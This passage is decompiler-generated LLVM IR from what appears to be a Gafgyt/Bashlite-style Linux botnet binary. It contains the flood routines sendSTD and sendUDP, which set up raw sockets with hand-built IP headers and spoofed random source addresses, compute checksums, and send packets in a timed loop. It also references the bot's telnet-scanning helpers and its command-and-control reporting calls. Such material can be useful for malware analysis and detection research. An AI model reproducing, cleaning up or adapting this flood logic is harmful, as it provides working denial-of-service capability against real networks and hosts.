179, 194, 195, 196, 197, 198, 199, 200, 223, 202, 203, 216, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 224, 217, 218, 219, 220, 221, 222 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 513, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d8eb, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804c9f7, { 1, 0 }
  uselistorder label %dec_label_pc_804c9a8, { 1, 0 }
  uselistorder label %dec_label_pc_804c99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c98b, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804d912 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804d922 = call i32 @__GI_time(i32* null)
  %v1_804d934 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804d93f = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804d960 = add i32 %v1_804d934, 12
  %v2_804d960 = inttoptr i32 %v1_804d960 to i32*
  %v3_804d960 = load i32, i32* %v2_804d960, align 4
  %v2_804d968 = ptrtoint i32* %stack_var_-40 to i32
  %v1_804d96e = add i32 %v1_804d934, 16
  %v2_804d96e = inttoptr i32 %v1_804d96e to i32*
  %v3_804d96e = load i32, i32* %v2_804d96e, align 4
  %v1_804d971 = inttoptr i32 %v3_804d96e to i32*
  %v2_804d971 = load i32, i32* %v1_804d971, align 4
  %v4_804d979 = call i32 @bcopy(i32 %v2_804d971, i32 %v2_804d968, i32 %v3_804d960)
  %v1_804d984 = add i32 %v1_804d934, 8
  %v2_804d984 = inttoptr i32 %v1_804d984 to i32*
  %v3_804d984 = load i32, i32* %v2_804d984, align 4
  store i32 %v3_804d984, i32* %stack_var_-44, align 4
  %v4_804d9af = bitcast i32* %stack_var_-188 to i16*
  %v5_804da3a = add i32 %v2_804d922, %arg3
  br label %dec_label_pc_804d999

dec_label_pc_804d999:                             ; preds = %dec_label_pc_804da60, %entry
  %storemerge = phi i32 [ %v4_804da60, %dec_label_pc_804da60 ], [ 0, %entry ]
  %v5_804d9af = call i32 @memcpy(i16* %v4_804d9af, i32 ptrtoint ([36 x i8*]* @global_var_80586a0.299 to i32), i32 144)
  store i32 %v5_804d9af, i32* @eax, align 4
  %v0_804d9b7 = call i32 @random()
  %v2_804d9c7 = udiv i32 %v0_804d9b7, 36
  %tmp = mul nsw i32 %v2_804d9c7, -4
  %v2_804d9e4 = add i32 %v0_804d9b7, %tmp
  store i32 %v2_804d9e4, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804d999.dec_label_pc_804da60_crit_edge, label %dec_label_pc_804da02

dec_label_pc_804d999.dec_label_pc_804da60_crit_edge: ; preds = %dec_label_pc_804d999
  br label %dec_label_pc_804da60

dec_label_pc_804da02:                             ; preds = %dec_label_pc_804d999
  %v0_804d9f2 = load i32, i32* @ebp, align 4
  %v3_804d9f2 = add i32 %v0_804d9f2, -184
  %v2_804d9f2 = mul i32 %v2_804d9e4, 4
  %v4_804d9f2 = add i32 %v3_804d9f2, %v2_804d9f2
  %v5_804d9f2 = inttoptr i32 %v4_804d9f2 to i32*
  %v6_804d9f2 = load i32, i32* %v5_804d9f2, align 4
  %v5_804da0c = call i32 @__libc_send(i32 %v4_804d912, i32 %v6_804d9f2, i32 65, i32 0)
  %v4_804da20 = call i32 @__libc_connect(i32 %v4_804d912, i32 %v2_804d93f, i32 16)
  %v2_804da2d = call i32 @__GI_time(i32* null)
  %v5_804da3f = icmp slt i32 %v2_804da2d, %v5_804da3a
  br i1 %v5_804da3f, label %dec_label_pc_804da60, label %dec_label_pc_804da41

dec_label_pc_804da41:                             ; preds = %dec_label_pc_804da02
  %v1_804da47 = call i32 @__libc_close(i32 %v4_804d912)
  %v1_804da54 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804da60:                             ; preds = %dec_label_pc_804d999.dec_label_pc_804da60_crit_edge, %dec_label_pc_804da02
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804d999.dec_label_pc_804da60_crit_edge ], [ 0, %dec_label_pc_804da02 ]
  %v4_804da60 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804d999

; uselistorder directives
  uselistorder i32 %v2_804d9e4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804d934, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_804da60, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp41 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804da6c = load i32, i32* @ebx, align 4
  %v12_804da6d = ptrtoint i32* %stack_var_-124 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804da76 = icmp eq i32 %arg2, 0
  %v1_804da7a = icmp eq i1 %v4_804da76, false
  br i1 %v1_804da7a, label %dec_label_pc_804da87, label %dec_label_pc_804da7c

dec_label_pc_804da7c:                             ; preds = %entry
  %v1_804da7c = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804da9f

dec_label_pc_804da87:                             ; preds = %entry
  %v1_804da8a = urem i32 %arg2, 65536
  store i32 %v1_804da8a, i32* %eax.global-to-local, align 4
  %v1_804da93 = call i32 @htons(i32 %v1_804da8a)
  br label %dec_label_pc_804da9f

dec_label_pc_804da9f:                             ; preds = %dec_label_pc_804da7c, %dec_label_pc_804da87
  %v2_804daa2 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804daa5 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804daa5, i32* %eax.global-to-local, align 4
  %v4_804daac = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804daac, i32* %eax.global-to-local, align 4
  %v1_804dab4 = icmp eq i32 %v4_804daac, 0
  %v1_804dab6 = icmp eq i1 %v1_804dab4, false
  br i1 %v1_804dab6, label %dec_label_pc_804df52, label %dec_label_pc_804dabc

dec_label_pc_804dabc:                             ; preds = %dec_label_pc_804da9f
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804dad5 = icmp eq i32 %arg4, 32
  %v1_804dad9 = icmp eq i1 %v9_804dad5, false
  br i1 %v1_804dad9, label %dec_label_pc_804dc11, label %dec_label_pc_804dadf

dec_label_pc_804dadf:                             ; preds = %dec_label_pc_804dabc
  %v4_804dae8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804dae8, i32* %eax.global-to-local, align 4
  %v4_804daf3 = icmp eq i32 %v4_804dae8, 0
  %v1_804daf7 = icmp eq i1 %v4_804daf3, false
  br i1 %v1_804daf7, label %dec_label_pc_804db14, label %dec_label_pc_804daf9

dec_label_pc_804daf9:                             ; preds = %dec_label_pc_804dadf
  %v0_804daf9 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804daf9, i32* %eax.global-to-local, align 4
  %v3_804db07 = call i32 @sockprintf(i32 %v0_804daf9, i32 ptrtoint ([27 x i8]* @global_var_8058730.300 to i32))
  store i32 %v3_804db07, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df52

dec_label_pc_804db14:                             ; preds = %dec_label_pc_804dadf
  %v1_804db17 = add i32 %arg5, 1
  store i32 %v1_804db17, i32* %eax.global-to-local, align 4
  %v1_804db1c = call i32 @malloc(i32 %v1_804db17)
  store i32 %v1_804db1c, i32* %eax.global-to-local, align 4
  %v4_804db27 = icmp eq i32 %v1_804db1c, 0
  br i1 %v4_804db27, label %dec_label_pc_804df52, label %dec_label_pc_804db31

dec_label_pc_804db31:                             ; preds = %dec_label_pc_804db14
  store i32 %v1_804db17, i32* %edx.global-to-local, align 4
  %v1_804db3a = inttoptr i32 %v1_804db1c to i8*
  store i32 %v1_804db1c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804db3f = and i32 %v1_804db1c, -256
  store i32 %v1_804db3f, i32* %eax.global-to-local, align 4
  %v5_804db41 = call i8* @_memset(i8* %v1_804db3a, i32 %v1_804db3f, i32 %v1_804db17)
  %v3_804db49 = call i32 @makeRandomStr(i8* %v1_804db3a, i32 %arg5)
  store i32 %v3_804db49, i32* %eax.global-to-local, align 4
  %v2_804db56 = call i32 @__GI_time(i32* null)
  %v5_804db5e = add i32 %v2_804db56, %arg3
  store i32 %v5_804db5e, i32* %eax.global-to-local, align 4
  %v1_804dbe5 = mul i32 %arg8, 100
  %v2_804dbee = mul i32 %arg8, 1000
  %v1_804dbf5 = sext i32 %v2_804dbee to i64
  br label %dec_label_pc_804db74.outer

dec_label_pc_804db74.outer:                       ; preds = %dec_label_pc_804dbd2, %dec_label_pc_804dc09, %dec_label_pc_804db31
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804db31 ], [ 0, %dec_label_pc_804dbd2 ], [ %v4_804dc09, %dec_label_pc_804dc09 ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804db31 ], [ %v4_804dbc7, %dec_label_pc_804dbd2 ], [ %v4_804dbc7, %dec_label_pc_804dc09 ]
  br label %dec_label_pc_804db74

dec_label_pc_804db74:                             ; preds = %dec_label_pc_804db74.outer, %dec_label_pc_804dba8
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804dba8 ], [ %stack_var_-92.0.ph, %dec_label_pc_804db74.outer ]
  store i32 %v2_804daa2, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804dae8, i32* %stack_var_-156, align 4
  %v7_804db89 = call i32 @__libc_sendto(i32 %v4_804dae8, i32 %v1_804db1c, i32 %arg5, i32 0, i32 %v2_804daa2, i32 16)
  store i32 %v7_804db89, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804db94 = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804db97 = icmp eq i1 %v15_804db94, false
  br i1 %v1_804db97, label %dec_label_pc_804dbc7, label %dec_label_pc_804db99

dec_label_pc_804db99:                             ; preds = %dec_label_pc_804db74
  br i1 %v1_804da7a, label %dec_label_pc_804dba8, label %dec_label_pc_804db9f

dec_label_pc_804db9f:                             ; preds = %dec_label_pc_804db99
  %v0_804db9f = load i32, i32* %stack_var_-156, align 4
  %v1_804db9f = call i32 @rand_cmwc(i32 %v0_804db9f)
  store i32 %v1_804db9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dba8

dec_label_pc_804dba8:                             ; preds = %dec_label_pc_804db99, %dec_label_pc_804db9f
  %v2_804dbad = call i32 @__GI_time(i32* null)
  store i32 %v2_804dbad, i32* %eax.global-to-local, align 4
  %v8_804dbb8 = icmp sgt i32 %v2_804dbad, %v5_804db5e
  br i1 %v8_804dbb8, label %dec_label_pc_804df52, label %dec_label_pc_804db74

dec_label_pc_804dbc7:                             ; preds = %dec_label_pc_804db74
  %v4_804dbc7 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804dbcd = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804dbd0 = icmp eq i1 %v15_804dbcd, false
  br i1 %v1_804dbd0, label %dec_label_pc_804dc09, label %dec_label_pc_804dbd2

dec_label_pc_804dbd2:                             ; preds = %dec_label_pc_804dbc7
  store i32 %v1_804dbe5, i32* %edx.global-to-local, align 4
  store i32 %v2_804dbee, i32* %eax.global-to-local, align 4
  %v2_804dbf5 = call i32 @usleep(i64 %v1_804dbf5)
  store i32 %v2_804dbf5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804db74.outer

dec_label_pc_804dc09:                             ; preds = %dec_label_pc_804dbc7
  %v4_804dc09 = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804db74.outer

dec_label_pc_804dc11:                             ; preds = %dec_label_pc_804dabc
  store i32 %v12_804da6d, i32* %eax.global-to-local, align 4
  %v4_804dc1f = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804dc1f, i32* %eax.global-to-local, align 4
  %v4_804dc2a = icmp eq i32 %v4_804dc1f, 0
  %v1_804dc2e = icmp eq i1 %v4_804dc2a, false
  br i1 %v1_804dc2e, label %dec_label_pc_804dc4b, label %dec_label_pc_804dc30

dec_label_pc_804dc30:                             ; preds = %dec_label_pc_804dc11
  %v0_804dc30 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804dc30, i32* %eax.global-to-local, align 4
  %v3_804dc3e = call i32 @sockprintf(i32 %v0_804dc30, i32 ptrtoint ([27 x i8]* @global_var_8058730.300 to i32))
  store i32 %v3_804dc3e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df4f

dec_label_pc_804dc4b:                             ; preds = %dec_label_pc_804dc11
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804dc57 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804dc57, i32* %eax.global-to-local, align 4
  store i32 %v4_804dc1f, i32* %stack_var_-156, align 4
  %v5_804dc62 = call i32 @__GI_setsockopt(i32 %v4_804dc1f, i32 0, i32 3, i32 %v2_804dc57, i32 4)
  store i32 %v5_804dc62, i32* %eax.global-to-local, align 4
  %v2_804dc6a = icmp slt i32 %v5_804dc62, 0
  %v1_804dc6c = icmp eq i1 %v2_804dc6a, false
  br i1 %v1_804dc6c, label %dec_label_pc_804dcc2.preheader, label %dec_label_pc_804dc6e

dec_label_pc_804dcc2.preheader:                   ; preds = %dec_label_pc_804dc4b
  br label %dec_label_pc_804dc92

dec_label_pc_804dc6e:                             ; preds = %dec_label_pc_804dc4b
  %v0_804dc6e = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804dc6e, i32* %eax.global-to-local, align 4
  %v3_804dc7c = call i32 @sockprintf(i32 %v0_804dc6e, i32 ptrtoint ([33 x i8]* @global_var_805874c.301 to i32))
  store i32 %v3_804dc7c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df4f

dec_label_pc_804dc92:                             ; preds = %dec_label_pc_804dcc2.preheader, %dec_label_pc_804dc92
  %stack_var_-32.088 = phi i32 [ 50, %dec_label_pc_804dcc2.preheader ], [ %v4_804dcc2, %dec_label_pc_804dc92 ]
  %v4_804dcc2 = add nsw i32 %stack_var_-32.088, -1
  %v2_804dc97 = call i32 @__GI_time(i32* null)
  store i32 %v2_804dc97, i32* %eax.global-to-local, align 4
  store i32 %v2_804dc97, i32* @ebx, align 4
  %v1_804dca1 = call i32 @rand_cmwc(i32 0)
  %v1_804dca6 = load i32, i32* @ebx, align 4
  %v2_804dca6 = xor i32 %v1_804dca6, %v1_804dca1
  store i32 %v2_804dca6, i32* @eax, align 4
  %v1_804dcac = call i32 @srand(i32 %v2_804dca6)
  store i32 %v1_804dcac, i32* @eax, align 4
  %v0_804dcb4 = call i32 @random()
  store i32 %v0_804dcb4, i32* %eax.global-to-local, align 4
  %v1_804dcba = call i32 @init_rand(i32 %v0_804dcb4)
  store i32 %v1_804dcba, i32* %eax.global-to-local, align 4
  %v13_804dcc5 = icmp eq i32 %v4_804dcc2, 0
  %v1_804dcc9 = icmp eq i1 %v13_804dcc5, false
  br i1 %v1_804dcc9, label %dec_label_pc_804dc92, label %dec_label_pc_804dccb

dec_label_pc_804dccb:                             ; preds = %dec_label_pc_804dc92
  %v4_804dccb = icmp eq i32 %arg4, 0
  %v1_804dccf = icmp eq i1 %v4_804dccb, false
  br i1 %v1_804dccf, label %dec_label_pc_804dcda, label %dec_label_pc_804dcf0

dec_label_pc_804dcda:                             ; preds = %dec_label_pc_804dccb
  %v5_804dce1 = sub i32 32, %arg4
  %v2_804dce9 = urem i32 %v5_804dce1, 32
  %v4_804dce9 = icmp eq i32 %v2_804dce9, 0
  br i1 %v4_804dce9, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_804dcda
  %v5_804dce9 = shl i32 1, %v2_804dce9
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_804dcda, %bb
  %v0_804dceb = phi i32 [ %v5_804dce9, %bb ], [ 1, %dec_label_pc_804dcda ]
  %v1_804dceb = sub i32 0, %v0_804dceb
  store i32 %v1_804dceb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dcf0

dec_label_pc_804dcf0:                             ; preds = %dec_label_pc_804dccb, %bb84
  %storemerge6 = phi i32 [ %v1_804dceb, %bb84 ], [ 0, %dec_label_pc_804dccb ]
  %v1_804dcf3 = add i32 %arg5, 28
  %v1_804dcff = add i32 %arg5, 58
  %v2_804dd02 = and i32 %v1_804dcff, -16
  %v2_804dd08 = sub i32 %v12_804da6d, %v2_804dd02
  %v1_804dd10 = add i32 %v2_804dd08, 15
  %v2_804dd13 = and i32 %v1_804dd10, -16
  %v1_804dd2b = add i32 %v2_804dd13, 20
  %v5_804dd2e = inttoptr i32 %v1_804dd2b to i16*
  %v1_804dd34 = add i32 %arg5, 8
  store i32 %v1_804dd34, i32* %eax.global-to-local, align 4
  store i32 %v1_804dd34, i32* @ebx, align 4
  %v5_804dd3c = add i32 %v2_804dd08, -16
  %v6_804dd3c = inttoptr i32 %v5_804dd3c to i32*
  store i32 %storemerge6, i32* %v6_804dd3c, align 4
  %v2_804dd3f = call i32 @GetRandomIP(i32 %v1_804dcf3, i32 %v2_804dd13)
  store i32 %v2_804dd3f, i32* %eax.global-to-local, align 4
  %v0_804dd44 = load i32, i32* @esp, align 4
  %v3_804dd4a = inttoptr i32 %v0_804dd44 to i32*
  store i32 %v2_804dd3f, i32* %v3_804dd4a, align 4
  %v0_804dd4b = call i32 @htonl()
  store i32 %v0_804dd4b, i32* %eax.global-to-local, align 4
  %v0_804dd50 = load i32, i32* @esp, align 4
  %v3_804dd53 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804dd53, i32* %edx.global-to-local, align 4
  %v0_804dd59 = load i32, i32* @ebx, align 4
  %v2_804dd59 = add i32 %v0_804dd50, 8
  %v3_804dd59 = inttoptr i32 %v2_804dd59 to i32*
  store i32 %v0_804dd59, i32* %v3_804dd59, align 4
  %v1_804dd5a = add i32 %v0_804dd50, 4
  %v2_804dd5a = inttoptr i32 %v1_804dd5a to i32*
  store i32 17, i32* %v2_804dd5a, align 4
  %v3_804dd5c = inttoptr i32 %v0_804dd50 to i32*
  store i32 %v0_804dd4b, i32* %v3_804dd5c, align 4
  %v0_804dd5d = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd5d = add i32 %v0_804dd50, -4
  %v3_804dd5d = inttoptr i32 %v2_804dd5d to i32*
  store i32 %v0_804dd5d, i32* %v3_804dd5d, align 4
  %v5_804dd5e = add i32 %v0_804dd50, -8
  %v6_804dd5e = inttoptr i32 %v5_804dd5e to i32*
  store i32 %v2_804dd13, i32* %v6_804dd5e, align 4
  %v0_804dd61 = call i32 @makeIPPacket()
  %v0_804dd66 = load i32, i32* @esp, align 4
  %v1_804dd6f = urem i32 %v1_804dd34, 65536
  store i32 %v1_804dd6f, i32* %eax.global-to-local, align 4
  %v2_804dd77 = add i32 %v0_804dd66, 8
  %v3_804dd77 = inttoptr i32 %v2_804dd77 to i32*
  store i32 %v1_804dd6f, i32* %v3_804dd77, align 4
  %v2_804dd78 = call i32 @htons(i32 %v1_804dd2b)
  %v3_804dd78 = trunc i32 %v2_804dd78 to i16
  %sext7 = mul i32 %v2_804dd78, 65536
  %v1_804dd80 = sdiv i32 %sext7, 65536
  store i32 %v1_804dd80, i32* %edx.global-to-local, align 4
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v3_804dd85 = add i32 %v2_804dd13, 24
  %v4_804dd85 = inttoptr i32 %v3_804dd85 to i16*
  store i16 %v3_804dd78, i16* %v4_804dd85, align 8
  %v2_804dd89 = call i32 @rand_cmwc(i32 %v1_804dd2b)
  %sext = mul i32 %v2_804dd89, 65536
  %v1_804dd8e = sdiv i32 %sext, 65536
  store i32 %v1_804dd8e, i32* %edx.global-to-local, align 4
  store i32 %v1_804dd2b, i32* %eax.global-to-local, align 4
  %v1_804dd93 = trunc i32 %v1_804dd8e to i16
  store i16 %v1_804dd93, i16* %v5_804dd2e, align 4
  br i1 %v1_804da7a, label %dec_label_pc_804dda7, label %dec_label_pc_804dd9c

dec_label_pc_804dd9c:                             ; preds = %dec_label_pc_804dcf0
  %v2_804dd9c = call i32 @rand_cmwc(i32 %v1_804dd2b)
  store i32 %v2_804dd9c, i32* %eax.global-to-local, align 4
  %.pre37 = urem i32 %arg2, 65536
  br label %dec_label_pc_804ddbf

dec_label_pc_804dda7:                             ; preds = %dec_label_pc_804dcf0
  %v1_804ddaa = urem i32 %arg2, 65536
  store i32 %v1_804ddaa, i32* %eax.global-to-local, align 4
  %v0_804ddaf = load i32, i32* @esp, align 4
  %v2_804ddb2 = add i32 %v0_804ddaf, -16
  %v3_804ddb2 = inttoptr i32 %v2_804ddb2 to i32*
  store i32 %v1_804ddaa, i32* %v3_804ddb2, align 4
  %v1_804ddb3 = sext i16 %tmp41 to i32
  %v2_804ddb3 = call i32 @htons(i32 %v1_804ddb3)
  store i32 %v2_804ddb3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddbf

dec_label_pc_804ddbf:                             ; preds = %dec_label_pc_804dd9c, %dec_label_pc_804dda7
  %v1_804de6a.pre-phi = phi i32 [ %.pre37, %dec_label_pc_804dd9c ], [ %v1_804ddaa, %dec_label_pc_804dda7 ]
  %storemerge5.in = phi i32 [ %v2_804dd9c, %dec_label_pc_804dd9c ], [ %v2_804ddb3, %dec_label_pc_804dda7 ]
  %storemerge5 = trunc i32 %storemerge5.in to i16
  %sext8 = mul i32 %storemerge5.in, 65536
  %v4_804ddc2 = sdiv i32 %sext8, 65536
  store i32 %v4_804ddc2, i32* %edx.global-to-local, align 4
  %v3_804ddc5 = add i32 %v2_804dd13, 22
  %v4_804ddc5 = inttoptr i32 %v3_804ddc5 to i16*
  store i16 %storemerge5, i16* %v4_804ddc5, align 2
  %v1_804ddcc = add i32 %v2_804dd13, 26
  %v2_804ddcc = inttoptr i32 %v1_804ddcc to i16*
  store i16 0, i16* %v2_804ddcc, align 2
  %v1_804ddd5 = add i32 %v2_804dd13, 28
  store i32 %v1_804ddd5, i32* %eax.global-to-local, align 4
  %v4_804ddd8 = load i32, i32* @esp, align 4
  %v5_804ddd8 = add i32 %v4_804ddd8, -4
  %v6_804ddd8 = inttoptr i32 %v5_804ddd8 to i32*
  store i32 %arg5, i32* %v6_804ddd8, align 4
  %v0_804dddb = load i32, i32* %eax.global-to-local, align 4
  %v2_804dddb = add i32 %v4_804ddd8, -8
  %v3_804dddb = inttoptr i32 %v2_804dddb to i32*
  store i32 %v0_804dddb, i32* %v3_804dddb, align 4
  %v3_804dddc = inttoptr i32 %v4_804ddc2 to i8*
  %v4_804dddc = call i32 @makeRandomStr(i8* %v3_804dddc, i32 %v12_804da6d)
  %v0_804dde1 = load i32, i32* @esp, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v1_804dde7 = or i32 %v2_804dd13, 2
  %v2_804dde7 = inttoptr i32 %v1_804dde7 to i16*
  %v3_804dde7 = load i16, i16* %v2_804dde7, align 2
  %v4_804dde7 = zext i16 %v3_804dde7 to i32
  store i32 %v4_804dde7, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v2_804ddf6 = add i32 %v0_804dde1, 4
  %v3_804ddf6 = inttoptr i32 %v2_804ddf6 to i32*
  store i32 %v4_804dde7, i32* %v3_804ddf6, align 4
  %v0_804ddf7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ddf7 = inttoptr i32 %v0_804dde1 to i32*
  store i32 %v0_804ddf7, i32* %v3_804ddf7, align 4
  %v3_804ddf8 = inttoptr i32 %v4_804ddc2 to i16*
  %v4_804ddf8 = call i32 @csum(i16* %v3_804ddf8, i32 %v12_804da6d)
  %v5_804ddf8 = trunc i32 %v4_804ddf8 to i16
  %sext11 = mul i32 %v4_804ddf8, 65536
  %v1_804de00 = sdiv i32 %sext11, 65536
  store i32 %v1_804de00, i32* %edx.global-to-local, align 4
  store i32 %v2_804dd13, i32* %eax.global-to-local, align 4
  %v3_804de05 = or i32 %v2_804dd13, 10
  %v4_804de05 = inttoptr i32 %v3_804de05 to i16*
  store i16 %v5_804ddf8, i16* %v4_804de05, align 2
  %v0_804de09 = load i32, i32* @esp, align 4
  %v1_804de0c = add i32 %v0_804de09, -16
  %v2_804de0c = inttoptr i32 %v1_804de0c to i32*
  store i32 0, i32* %v2_804de0c, align 4
  %v2_804de0e = inttoptr i32 %v4_804ddc2 to i32*
  %v3_804de0e = call i32 @__GI_time(i32* %v2_804de0e)
  %v0_804de13 = load i32, i32* @esp, align 4
  %v1_804de13 = add i32 %v0_804de13, 16
  %v5_804de16 = add i32 %v3_804de0e, %arg3
  store i32 %v5_804de16, i32* %eax.global-to-local, align 4
  %v3_804de94 = or i32 %v2_804dd13, 4
  %v4_804de94 = inttoptr i32 %v3_804de94 to i16*
  %v2_804deb7 = or i32 %v2_804dd13, 12
  %v3_804deb7 = inttoptr i32 %v2_804deb7 to i32*
  %v1_804df23 = mul i32 %arg8, 100
  %v2_804df2c = mul i32 %arg8, 1000
  br label %dec_label_pc_804de2c.outer

dec_label_pc_804de2c.outer:                       ; preds = %dec_label_pc_804df10, %dec_label_pc_804df47, %dec_label_pc_804ddbf
  %v0_804de32.pre = phi i32 [ %v1_804de13, %dec_label_pc_804ddbf ], [ %v1_804df38, %dec_label_pc_804df10 ], [ %v0_804de32.pre.pre.pre, %dec_label_pc_804df47 ]
  %stack_var_-102.0.ph = phi i16 [ %tmp, %dec_label_pc_804ddbf ], [ %storemerge, %dec_label_pc_804df10 ], [ %storemerge, %dec_label_pc_804df47 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804ddbf ], [ 0, %dec_label_pc_804df10 ], [ %v4_804df47, %dec_label_pc_804df47 ]
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804ddbf ], [ %v4_804df05, %dec_label_pc_804df10 ], [ %v4_804df05, %dec_label_pc_804df47 ]
  br label %dec_label_pc_804de2c

dec_label_pc_804de2c:                             ; preds = %dec_label_pc_804de2c.outer, %dec_label_pc_804dee7
  %v0_804de32 = phi i32 [ %v1_804def1, %dec_label_pc_804dee7 ], [ %v0_804de32.pre, %dec_label_pc_804de2c.outer ]
  %stack_var_-102.0 = phi i16 [ %storemerge, %dec_label_pc_804dee7 ], [ %stack_var_-102.0.ph, %dec_label_pc_804de2c.outer ]
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804dee7 ], [ %stack_var_-84.0.ph, %dec_label_pc_804de2c.outer ]
  store i32 %v2_804daa2, i32* %eax.global-to-local, align 4
  store i32 %v2_804dd13, i32* %edx.global-to-local, align 4
  %v1_804de35 = add i32 %v0_804de32, -12
  %v2_804de35 = inttoptr i32 %v1_804de35 to i32*
  store i32 16, i32* %v2_804de35, align 4
  %v2_804de37 = add i32 %v0_804de32, -16
  %v3_804de37 = inttoptr i32 %v2_804de37 to i32*
  store i32 %v2_804daa2, i32* %v3_804de37, align 4
  %v1_804de38 = add i32 %v0_804de32, -20
  %v2_804de38 = inttoptr i32 %v1_804de38 to i32*
  store i32 0, i32* %v2_804de38, align 4
  %v5_804de3a = add i32 %v0_804de32, -24
  %v6_804de3a = inttoptr i32 %v5_804de3a to i32*
  store i32 %v1_804dcf3, i32* %v6_804de3a, align 4
  %v0_804de3d = load i32, i32* %edx.global-to-local, align 4
  %v2_804de3d = add i32 %v0_804de32, -28
  %v3_804de3d = inttoptr i32 %v2_804de3d to i32*
  store i32 %v0_804de3d, i32* %v3_804de3d, align 4
  %v5_804de3e = add i32 %v0_804de32, -32
  %v6_804de3e = inttoptr i32 %v5_804de3e to i32*
  store i32 %v4_804dc1f, i32* %v6_804de3e, align 4
